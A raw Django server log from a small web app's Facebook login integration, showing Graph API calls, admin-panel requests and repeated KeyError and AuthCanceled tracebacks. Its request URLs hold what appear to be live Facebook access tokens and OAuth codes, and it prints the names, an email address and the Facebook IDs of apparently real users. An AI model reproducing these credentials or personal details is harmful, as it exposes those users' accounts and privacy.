{'error': {'message': '(#100) Tried accessing nonexisting field (headline) on node type (User)', 'type': 'OAuthException', 'code': 100, 'fbtrace_id': 'GpJPqHot3VB'}}
2229631310400558
https://graph.facebook.com/v2.9/2229631310400558?fields=name,email,gender,location,picture,link,headline&access_token=EAADvEwDa2W8BAL6IKlv8YkZBRe4ammqJw8CGjTYmMZCKxkaLqG8eT4WBIh8goPgbfmEDSXQTH1WiE4iGnzDBHCLFGxcGxHVhaaoGntGVa0MKZCQwpTJ4bZAQQwZB4Y9tIiA7wuEaOlJrBjPM7voAqUrg1KZCb4jE0hU9WCfe0AQgZDZD
{'error': {'message': '(#100) Tried accessing nonexisting field (headline) on node type (User)', 'type': 'OAuthException', 'code': 100, 'fbtrace_id': 'E9LI6fJ4TVn'}}
2229631310400558
https://graph.facebook.com/v2.9/2229631310400558?fields=name,email,gender,location,picture,link,headline&access_token=EAADvEwDa2W8BAL6IKlv8YkZBRe4ammqJw8CGjTYmMZCKxkaLqG8eT4WBIh8goPgbfmEDSXQTH1WiE4iGnzDBHCLFGxcGxHVhaaoGntGVa0MKZCQwpTJ4bZAQQwZB4Y9tIiA7wuEaOlJrBjPM7voAqUrg1KZCb4jE0hU9WCfe0AQgZDZD
{'error': {'message': '(#100) Tried accessing nonexisting field (headline) on node type (User)', 'type': 'OAuthException', 'code': 100, 'fbtrace_id': 'AI0U+s4yhAX'}}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
here
None
2229631310400558
https://graph.facebook.com/v2.9/2229631310400558?fields=name,email,gender,location,picture,link,headline&access_token=EAADvEwDa2W8BAO46dsZAGZBSnOQ7Dl0FwKrP4VmxqjHl3s9Y255c3lxf2X72sz0my4XoabfoGjdXzVwZBL3CHEwNQAyUC16uHo1SeCW2cxeWZACdm9vj85QWIRZBE9NqVb46lubQSDVQexPG5A3LKdH0aF7oCpg1SoTsmKRdVGgZDZD
{'error': {'message': '(#100) Tried accessing nonexisting field (headline) on node type (User)', 'type': 'OAuthException', 'code': 100, 'fbtrace_id': 'FIDfS55pXy4'}}
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
[15/Dec/2018 18:51:45] "GET /admin/logout/ HTTP/1.1" 200 1207
[15/Dec/2018 18:51:48] "GET /admin/ HTTP/1.1" 302 0
[15/Dec/2018 18:51:49] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1819
[15/Dec/2018 18:52:44] "GET / HTTP/1.1" 200 13156
[15/Dec/2018 18:52:47] "GET /login HTTP/1.1" 301 0
[15/Dec/2018 18:52:47] "GET /login/ HTTP/1.1" 200 2576
[15/Dec/2018 18:52:51] "GET /oauth/login/facebook/ HTTP/1.1" 302 0
[15/Dec/2018 18:52:53] "GET /oauth/complete/facebook/?granted_scopes=email%2Cpublic_profile&denied_scopes&code=AQCGKvNB1BDb6Dwgn5EUqJkE_w0lmwrNKov_tIa_gPimx5i5C5CLsmTApL6CUlafvgvAJwxqGeTy9lBnj2sdwSaUraETKeps91z9FD2Fi1DBmHj82zhYp5zPsD5CQarG44ujX_lPcg9mRqtBfg4wdpCIdOYjbnN_sPDB8B_xL1M4p4KL7IoySnxbB9S18xONDjcEHDO0HZisxbh2lp9BckDtPquiYCufJQ87fi2TtT3Bc1HyyI6pzSFgXEg05dGE8UskohzaLedlhc-5JL5MdLQlz6mAVSpa_beFE0FESK9sEyQ4e1GlsPSr4Mp5_hyidIKpnDM5AT3QFJlzwQwkc2tvsbGdooPYfTRW6uzftlUGkQ&state=mGiykyZA46GjuP2prWEbJdxm2QdwjQXA HTTP/1.1" 302 0
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 48, in dashboard
    info.city = data['location']['name']
KeyError: 'location'
[15/Dec/2018 18:52:54] "GET / HTTP/1.1" 500 69068
Validating models...

System check identified no issues (0 silenced).
December 15, 2018 - 18:50:11
Django version 2.1, using settings 'project.settings'
Starting development server at https://0.0.0.0:443/
Using SSL certificate: letsencryptCert1.pem
Using SSL key: letsencryptprivkey1.pem
Quit the server with CONTROL-C.
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
here
None
2229631310400558
https://graph.facebook.com/v2.9/2229631310400558?fields=name,email,gender,location,picture,link&access_token=EAADvEwDa2W8BAIatbJnyI9xDcVr7qc0ZBPUvaGHFhpOQ3ZB6ZBT1WZCgrGu5BJgIPqciplK50o2ehZAZAYRcHrpQZBBzaROwZBFaRTfjza8qIav2NhSx3z7YE2lN5ZCHc8y5LXzjCsYix3oZC4NJQSP8gWtC0yWkjtYZAvF3leF8O40zgZDZD
{'name': 'Apoorv Khare', 'email': 'apoorvkhare007@gmail.com', 'picture': {'data': {'height': 50, 'is_silhouette': False, 'url': 'https://platform-lookaside.fbsbx.com/platform/profilepic/?asid=2229631310400558&height=50&width=50&ext=1547491974&hash=AeTlSRnzT0YvQ_Mh', 'width': 50}}, 'id': '2229631310400558'}
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 48, in dashboard
    info.city = data['location']['name']
KeyError: 'location'
[15/Dec/2018 19:20:43] "GET / HTTP/1.1" 500 69196
[15/Dec/2018 19:23:13] "GET /logout HTTP/1.1" 302 0
[15/Dec/2018 19:23:13] "GET /login/ HTTP/1.1" 200 2576
[15/Dec/2018 19:23:18] "GET /admin/ HTTP/1.1" 302 0
[15/Dec/2018 19:23:19] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1819
[15/Dec/2018 19:23:26] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
[15/Dec/2018 19:23:26] "GET /admin/ HTTP/1.1" 200 12210
[15/Dec/2018 19:23:29] "GET /admin/social_django/usersocialauth/ HTTP/1.1" 200 6834
[15/Dec/2018 19:23:30] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[15/Dec/2018 19:23:37] "POST /admin/social_django/usersocialauth/ HTTP/1.1" 200 3455
[15/Dec/2018 19:23:38] "GET /static/admin/js/cancel.js HTTP/1.1" 200 410
[15/Dec/2018 19:23:40] "POST /admin/social_django/usersocialauth/ HTTP/1.1" 302 0
[15/Dec/2018 19:23:40] "GET /admin/social_django/usersocialauth/ HTTP/1.1" 200 6519
[15/Dec/2018 19:23:41] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[15/Dec/2018 19:23:42] "GET /static/admin/img/icon-yes.svg HTTP/1.1" 200 436
[15/Dec/2018 19:24:22] "GET /admin/logout/ HTTP/1.1" 200 1207
[15/Dec/2018 19:24:30] "GET /login HTTP/1.1" 301 0
[15/Dec/2018 19:24:30] "GET /login/ HTTP/1.1" 200 2576
[15/Dec/2018 19:24:34] "GET /oauth/login/facebook/ HTTP/1.1" 302 0
Validating models...

System check identified no issues (0 silenced).
December 15, 2018 - 19:20:35
Django version 2.1, using settings 'project.settings'
Starting development server at https://0.0.0.0:443/
Using SSL certificate: letsencryptCert1.pem
Using SSL key: letsencryptprivkey1.pem
Quit the server with CONTROL-C.
2229631310400558
https://graph.facebook.com/v2.9/2229631310400558?fields=name,email,gender,location,picture,link&access_token=EAADvEwDa2W8BAIatbJnyI9xDcVr7qc0ZBPUvaGHFhpOQ3ZB6ZBT1WZCgrGu5BJgIPqciplK50o2ehZAZAYRcHrpQZBBzaROwZBFaRTfjza8qIav2NhSx3z7YE2lN5ZCHc8y5LXzjCsYix3oZC4NJQSP8gWtC0yWkjtYZAvF3leF8O40zgZDZD
{'name': 'Apoorv Khare', 'email': 'apoorvkhare007@gmail.com', 'picture': {'data': {'height': 50, 'is_silhouette': False, 'url': 'https://platform-lookaside.fbsbx.com/platform/profilepic/?asid=2229631310400558&height=50&width=50&ext=1547493643&hash=AeRZ_jajS3wmVjbC', 'width': 50}}, 'id': '2229631310400558'}
here
None
here
None
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
[15/Dec/2018 19:30:30] "GET /login/ HTTP/1.1" 200 2576
[15/Dec/2018 19:30:32] "GET /login/ HTTP/1.1" 200 2576
[15/Dec/2018 19:30:33] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[15/Dec/2018 19:30:34] "GET /oauth/login/facebook/ HTTP/1.1" 302 0
[15/Dec/2018 19:30:47] "GET /oauth/login/facebook/ HTTP/1.1" 302 0
Validating models...

System check identified no issues (0 silenced).
December 15, 2018 - 19:30:19
Django version 2.1, using settings 'project.settings'
Starting development server at https://0.0.0.0:443/
Using SSL certificate: letsencryptCert1.pem
Using SSL key: letsencryptprivkey1.pem
Quit the server with CONTROL-C.
here
None
here
None
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
[15/Dec/2018 19:31:16] "GET /login/ HTTP/1.1" 200 2576
[15/Dec/2018 19:31:17] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[15/Dec/2018 19:31:18] "GET /oauth/login/facebook/ HTTP/1.1" 302 0
[15/Dec/2018 19:31:20] "GET /oauth/complete/facebook/?granted_scopes=email%2Cpublic_profile&denied_scopes&code=AQBh6Jc8P11O4SPu3-nNuScFUhJpUIpmEimd3bsCs6pXSHH7tpjvqq440g5OqbaRi2-5IGqpU13HpJaaD-UedZTy89UAvhP1Oh6WqN2GQgjL8ZzeV6tRTiv-PPk3ju2fgHSyrM7aOqc9O2gHlQCdy2Kxeii_eTdad1Rz4S-NBxKRmKecfKIN0hvq24ciKoaIdRGR60pj2bWkh_HCM11Qdz-P9ub6U65cEPqiQR2tsNuaJjcbgVMefglYOAFceBcqSH2JK4xFDYzOJeiWEmGZNWanG549J2DlmPKs-cEP4_G5bjfH6yTcUAOSAGD6BP-qVWgC6veEo6cmmnW8Wdq52UE3KBUtd_H4MAoj-kuNgqlw8A&state=ngcOf4wCF0o2zJIjgQsUmcjFBIbQVyd8 HTTP/1.1" 302 0
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 48, in dashboard
    info.city = data['location']['name']
KeyError: 'location'
[15/Dec/2018 19:31:21] "GET / HTTP/1.1" 500 68865
Validating models...

System check identified no issues (0 silenced).
December 15, 2018 - 19:31:14
Django version 2.1, using settings 'project.settings'
Starting development server at https://0.0.0.0:443/
Using SSL certificate: letsencryptCert1.pem
Using SSL key: letsencryptprivkey1.pem
Quit the server with CONTROL-C.
here
None
2229631310400558
https://graph.facebook.com/v2.9/2229631310400558?fields=name,email,gender,location,picture,link&access_token=EAADvEwDa2W8BAJ4jwMuh16WsQaNIZAqOkI0Tf5SdmoswZBZAI8omnVZB3VsklJ8XlKJlFPZBYstHa0VjuFHcD0AYjfzxYrmC7ltdIQzTek9n7hOI0gYdyzRLTDjQI7YSrB4ybK4CEBElz6iFwBVEPLayACZBD2penHiqY1B1j6tgZDZD
{'name': 'Apoorv Khare', 'email': 'apoorvkhare007@gmail.com', 'picture': {'data': {'height': 50, 'is_silhouette': False, 'url': 'https://platform-lookaside.fbsbx.com/platform/profilepic/?asid=2229631310400558&height=50&width=50&ext=1547494281&hash=AeTKE1dEf6Ot1s8N', 'width': 50}}, 'id': '2229631310400558'}
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
[15/Dec/2018 19:43:07] "GET /login/ HTTP/1.1" 302 0
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 48, in dashboard
    info.city = data['location']['name']
KeyError: 'location'
[15/Dec/2018 19:43:08] "GET / HTTP/1.1" 500 68859
[15/Dec/2018 19:43:09] "GET /logout HTTP/1.1" 302 0
[15/Dec/2018 19:43:10] "GET /login/ HTTP/1.1" 200 2576
[15/Dec/2018 19:43:17] "GET /admin/ HTTP/1.1" 302 0
[15/Dec/2018 19:43:18] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1819
[15/Dec/2018 19:43:24] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
[15/Dec/2018 19:43:25] "GET /admin/ HTTP/1.1" 200 12216
[15/Dec/2018 19:43:29] "GET /admin/social_django/usersocialauth/ HTTP/1.1" 200 6834
[15/Dec/2018 19:43:30] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[15/Dec/2018 19:43:34] "GET /admin/social_django/usersocialauth/6/change/ HTTP/1.1" 200 7062
[15/Dec/2018 19:43:34] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[15/Dec/2018 19:43:35] "GET /static/admin/css/widgets.css HTTP/1.1" 200 10340
[15/Dec/2018 19:43:36] "GET /static/admin/js/change_form.js HTTP/1.1" 200 712
[15/Dec/2018 19:43:36] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 200 495
[15/Dec/2018 19:43:53] "POST /admin/social_django/usersocialauth/6/change/ HTTP/1.1" 302 0
[15/Dec/2018 19:43:53] "GET /admin/social_django/usersocialauth/ HTTP/1.1" 200 7062
[15/Dec/2018 19:43:54] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[15/Dec/2018 19:43:55] "GET /static/admin/img/icon-yes.svg HTTP/1.1" 200 436
[15/Dec/2018 19:43:59] "GET /admin/social_django/usersocialauth/6/change/ HTTP/1.1" 200 7080
[15/Dec/2018 19:43:59] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[15/Dec/2018 19:44:05] "POST /admin/social_django/usersocialauth/6/change/ HTTP/1.1" 302 0
[15/Dec/2018 19:44:06] "GET /admin/social_django/usersocialauth/ HTTP/1.1" 200 7062
[15/Dec/2018 19:44:07] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[15/Dec/2018 19:44:12] "GET /admin/logout/ HTTP/1.1" 200 1207
[15/Dec/2018 19:44:16] "GET /login/ HTTP/1.1" 200 2576
[15/Dec/2018 19:44:18] "GET /oauth/login/facebook/ HTTP/1.1" 302 0
Internal Server Error: /oauth/complete/facebook/
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/views/decorators/cache.py", line 44, in _wrapped_view_func
    response = view_func(request, *args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
    return view_func(*args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_django/utils.py", line 49, in wrapper
    return func(request, backend, *args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_django/views.py", line 33, in complete
    *args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_core/actions.py", line 43, in do_complete
    user = backend.complete(user=user, *args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_core/backends/base.py", line 40, in complete
    return self.auth_complete(*args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_core/utils.py", line 259, in wrapper
    return func(*args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_core/backends/facebook.py", line 92, in auth_complete
    self.process_error(self.data)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_core/backends/facebook.py", line 87, in process_error
    data.get('error_code'))
social_core.exceptions.AuthCanceled: Authentication process canceled: Invalid Scopes: user_location. This message is only shown to developers. Users of your app will ignore these permissions if present. Please read the documentation for valid permissions at: https://developers.facebook.com/docs/facebook-login/permissions
[15/Dec/2018 19:44:38] "GET /oauth/complete/facebook/?error_code=100&error_message=Invalid+Scopes%3A+user_location.+This+message+is+only+shown+to+developers.+Users+of+your+app+will+ignore+these+permissions+if+present.+Please+read+the+documentation+for+valid+permissions+at%3A+https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fpermissions&state=VoQqrbvqDF1L7KMvtJ6mZ9YxvLZYeH80 HTTP/1.1" 500 109096
[15/Dec/2018 19:44:51] "GET / HTTP/1.1" 200 13156
[15/Dec/2018 19:44:53] "GET /logout HTTP/1.1" 302 0
[15/Dec/2018 19:44:54] "GET /accounts/login/?next=/logout HTTP/1.1" 200 2576
Not Found: /accounts/login/logo.jpeg
[15/Dec/2018 19:44:56] "GET /accounts/login/logo.jpeg HTTP/1.1" 404 6004
[15/Dec/2018 19:44:57] "GET /admin/ HTTP/1.1" 302 0
[15/Dec/2018 19:44:58] "GET /admin/ HTTP/1.1" 302 0
Not Found: /accounts/media/media/favicon.ico
[15/Dec/2018 19:44:58] "GET /accounts/media/media/favicon.ico HTTP/1.1" 404 6028
[15/Dec/2018 19:44:59] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1819
[15/Dec/2018 19:45:01] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1819
[15/Dec/2018 19:45:09] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
[15/Dec/2018 19:45:09] "GET /admin/ HTTP/1.1" 200 12372
[15/Dec/2018 19:47:02] "GET /admin/social_django/usersocialauth/ HTTP/1.1" 200 6834
[15/Dec/2018 19:47:37] "POST /admin/social_django/usersocialauth/ HTTP/1.1" 200 3455
[15/Dec/2018 19:47:38] "GET /static/admin/js/cancel.js HTTP/1.1" 200 410
[15/Dec/2018 19:47:41] "POST /admin/social_django/usersocialauth/ HTTP/1.1" 302 0
[15/Dec/2018 19:47:42] "GET /admin/social_django/usersocialauth/ HTTP/1.1" 200 6519
[15/Dec/2018 19:47:43] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[15/Dec/2018 19:47:47] "GET /admin/logout/ HTTP/1.1" 200 1207
[15/Dec/2018 19:47:50] "GET /login/ HTTP/1.1" 200 2576
[15/Dec/2018 19:47:52] "GET /oauth/login/facebook/ HTTP/1.1" 302 0
Internal Server Error: /oauth/complete/facebook/
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/views/decorators/cache.py", line 44, in _wrapped_view_func
    response = view_func(request, *args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
    return view_func(*args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_django/utils.py", line 49, in wrapper
    return func(request, backend, *args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_django/views.py", line 33, in complete
    *args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_core/actions.py", line 43, in do_complete
    user = backend.complete(user=user, *args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_core/backends/base.py", line 40, in complete
    return self.auth_complete(*args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_core/utils.py", line 259, in wrapper
    return func(*args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_core/backends/facebook.py", line 92, in auth_complete
    self.process_error(self.data)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_core/backends/facebook.py", line 87, in process_error
    data.get('error_code'))
social_core.exceptions.AuthCanceled: Authentication process canceled: Invalid Scopes: user_location. This message is only shown to developers. Users of your app will ignore these permissions if present. Please read the documentation for valid permissions at: https://developers.facebook.com/docs/facebook-login/permissions
[15/Dec/2018 19:54:31] "GET /oauth/complete/facebook/?error_code=100&error_message=Invalid+Scopes%3A+user_location.+This+message+is+only+shown+to+developers.+Users+of+your+app+will+ignore+these+permissions+if+present.+Please+read+the+documentation+for+valid+permissions+at%3A+https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fpermissions&state=Y4uB3V3PUSUdQCw6jNGphF3WXJF7ERkh HTTP/1.1" 500 109096
[15/Dec/2018 19:54:35] "GET /login/ HTTP/1.1" 200 2576
[16/Dec/2018 03:08:55] "GET / HTTP/1.1" 200 13156
[16/Dec/2018 03:08:56] "GET /media/media/logo.png HTTP/1.1" 200 11255
Not Found: /logo.jpeg
[16/Dec/2018 03:08:58] "GET /logo.jpeg HTTP/1.1" 404 5959
[16/Dec/2018 03:09:14] "GET /oauth/login/facebook/ HTTP/1.1" 302 0
[16/Dec/2018 03:09:43] "GET / HTTP/1.1" 200 13156
[16/Dec/2018 03:09:48] "GET /oauth/login/facebook/ HTTP/1.1" 302 0
[16/Dec/2018 03:10:53] "GET / HTTP/1.1" 200 13156
[16/Dec/2018 03:11:03] "GET /oauth/login/facebook/ HTTP/1.1" 302 0
[16/Dec/2018 03:11:33] "GET /oauth/complete/facebook/?granted_scopes=public_profile&denied_scopes&code=AQALDQZWYOiSMgFC_zJyOiL0UCIytUFnES_dTXcM84xgxCkWtt93ct-ihvn-pf3fIhQy_Wa8ytc8F30KLbmAcmujd4jBic8wN8mC9PC9enu3KPT7iSsp1XQITUBn-skL3RequK3W3lnq_zA_74bdCle8tzha8aBWLcVsvFjJJGLLWP1jFsKp6p-m04_6iKH_RAX32WMGaT9Yd4pJm8voNAwnVmwGZ0-jJsQb-Q32V9RNbsbOA9-R6IhG-35ZJuRXXXeZBTmmnTRCL0Y5-sP9hwL_uA-HyU4TxlpXPoLEnxLIRMTLG8JCBDZihKBLS9muv4PUP3ricpGZ5R7mAbbZFpQpSMtgfCjJAOUrzrOMzL_bPw&state=szvCi6iIWxlclzI7vK3yPHPuPvgIkwUP HTTP/1.1" 302 0
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 47, in dashboard
    info.email = data['email']
KeyError: 'email'
[16/Dec/2018 03:11:36] "GET / HTTP/1.1" 500 69258
Not Found: /favicon.ico
[16/Dec/2018 03:11:38] "GET /favicon.ico HTTP/1.1" 404 5965
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 47, in dashboard
    info.email = data['email']
KeyError: 'email'
[16/Dec/2018 03:11:56] "GET / HTTP/1.1" 500 68910
Validating models...

System check identified no issues (0 silenced).
December 15, 2018 - 19:42:54
Django version 2.1, using settings 'project.settings'
Starting development server at https://0.0.0.0:443/
Using SSL certificate: letsencryptCert1.pem
Using SSL key: letsencryptprivkey1.pem
Quit the server with CONTROL-C.
2229631310400558
https://graph.facebook.com/v2.9/2229631310400558?fields=name,email,gender,location,picture,link&access_token=EAADvEwDa2W8BAJ4jwMuh16WsQaNIZAqOkI0Tf5SdmoswZBZAI8omnVZB3VsklJ8XlKJlFPZBYstHa0VjuFHcD0AYjfzxYrmC7ltdIQzTek9n7hOI0gYdyzRLTDjQI7YSrB4ybK4CEBElz6iFwBVEPLayACZBD2penHiqY1B1j6tgZDZD
{'name': 'Apoorv Khare', 'email': 'apoorvkhare007@gmail.com', 'picture': {'data': {'height': 50, 'is_silhouette': False, 'url': 'https://platform-lookaside.fbsbx.com/platform/profilepic/?asid=2229631310400558&height=50&width=50&ext=1547494988&hash=AeQ_TwovJ7DripTl', 'width': 50}}, 'id': '2229631310400558'}
here
None
here
None
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
here
None
here
None
here
None
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
10213635886440448
https://graph.facebook.com/v2.9/10213635886440448?fields=name,email,gender,location,picture,link&access_token=EAADvEwDa2W8BAGaiuQF6rIC1UTEb48UUXINdUcK1mwcF8wZAms8tlZBrW2SjkMkcNjBKZCoAlJxnl24F3Mw1pQHVGb85LrtZAOIrsiTs2gVInSBKdoAV5tTUCAuTYMis5UoF2MnIbGM8Slpz3ZB2PL3lC0qA2VTfU580l37ntPAZDZD
{'name': 'Parul Solanki Sharma', 'picture': {'data': {'height': 50, 'is_silhouette': False, 'url': 'https://platform-lookaside.fbsbx.com/platform/profilepic/?asid=10213635886440448&height=50&width=50&ext=1547521893&hash=AeS1Q1mshiaF81Gz', 'width': 50}}, 'id': '10213635886440448'}
10213635886440448
https://graph.facebook.com/v2.9/10213635886440448?fields=name,email,gender,location,picture,link&access_token=EAADvEwDa2W8BAGaiuQF6rIC1UTEb48UUXINdUcK1mwcF8wZAms8tlZBrW2SjkMkcNjBKZCoAlJxnl24F3Mw1pQHVGb85LrtZAOIrsiTs2gVInSBKdoAV5tTUCAuTYMis5UoF2MnIbGM8Slpz3ZB2PL3lC0qA2VTfU580l37ntPAZDZD
{'name': 'Parul Solanki Sharma', 'picture': {'data': {'height': 50, 'is_silhouette': False, 'url': 'https://platform-lookaside.fbsbx.com/platform/profilepic/?asid=10213635886440448&height=50&width=50&ext=1547521915&hash=AeTya6zX3AOUmc8V', 'width': 50}}, 'id': '10213635886440448'}
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
Unknown command: 'runsslserver'. Did you mean runserver?
Type 'manage.py help' for usage.
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
